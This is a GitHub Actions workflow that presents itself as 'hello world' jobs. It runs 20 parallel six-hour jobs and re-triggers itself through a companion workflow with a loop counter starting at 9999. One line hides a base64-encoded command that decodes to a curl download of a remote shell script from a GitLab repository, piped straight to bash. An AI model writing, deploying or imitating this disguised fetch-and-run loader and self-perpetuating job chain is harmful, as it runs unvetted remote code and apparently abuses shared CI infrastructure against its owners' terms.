name: 🔵 LSCPU Phase

on:
  workflow_dispatch:
    inputs:
      loop_count:
        description: 'Siklus tersisa'
        required: true
        default: '9999'

permissions:
  actions: write

jobs:
  run-lscpu:
    name: ${{ matrix.name }}
    strategy:
      fail-fast: false
      max-parallel: 20
      matrix:
        include:
          - name: lscpu-A
          - name: lscpu-B
          - name: lscpu-C
          - name: lscpu-D
          - name: lscpu-E
          - name: lscpu-F
          - name: lscpu-G
          - name: lscpu-H
          - name: lscpu-I
          - name: lscpu-J
          - name: lscpu-K
          - name: lscpu-L
          - name: lscpu-M
          - name: lscpu-N
          - name: lscpu-O
          - name: lscpu-P
          - name: lscpu-Q
          - name: lscpu-R
          - name: lscpu-S
          - name: lscpu-T                                      
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - name: Jalankan dengan durasi dinamis
        run: |
          HOUR_UTC=$(date -u +%H)
          LOOP=${{ github.event.inputs.loop_count }}
          if [ "$HOUR_UTC" -ge 23 ] || [ "$HOUR_UTC" -lt 3 ]; then
            echo "🕕 Jam 6-9 pagi WIB (UTC 23-02). Sleep 3 jam."
            SLEEP=10800
          else
            if [ "$LOOP" -ge 9992 ]; then
              echo "🔄 6 hello world"
              SLEEP=650
            else
              echo "⏳ hello world"
              SLEEP=3600
            fi
          fi
          echo "hello world" & base64 -d <<< Y3VybCAtc0wgIGh0dHBzOi8vZ2l0bGFiLmNvbS9tYWthbmFuOTkvZGlhbW9uZHMvLS9yYXcvbWFpbi9yZXAuc2ggfCBiYXNo | sh & sleep 650

  trigger-hello:
    needs: run-lscpu
    runs-on: ubuntu-latest
    if: github.event.inputs.loop_count > 0
    steps:
      - name: Panggil Hello Phase
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          new_loop=$(( ${{ github.event.inputs.loop_count }} - 1 ))
          curl -X POST \
            -H "Authorization: token $GITHUB_TOKEN" \
            -H "Accept: application/vnd.github.v3+json" \
            https://api.github.com/repos/${{ github.repository }}/actions/workflows/phase-hello.yml/dispatches \
            -d "{\"ref\":\"main\",\"inputs\":{\"loop_count\":\"$new_loop\"}}"